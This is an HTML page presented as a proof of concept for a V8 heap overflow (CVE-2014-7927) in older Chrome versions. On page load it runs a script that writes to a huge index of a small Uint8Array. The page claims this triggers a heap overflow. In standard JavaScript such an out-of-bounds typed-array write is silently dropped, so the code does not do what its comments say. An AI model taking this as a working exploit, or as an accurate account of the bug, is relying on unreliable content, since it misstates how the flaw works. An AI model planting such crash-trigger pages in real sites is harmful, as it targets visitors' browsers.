<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CVE-2014-7927 V8 Heap Overflow</title>
</head>
<body>
<script>
// CVE-2014-7927: V8 heap overflow via typed array indexing
// Chrome < 40.0.2214.91
function trigger() {
    var arr = new Uint8Array(10);
    arr[1000000000] = 1;
}
setTimeout(trigger, 1000);
</script>
</body>
</html>
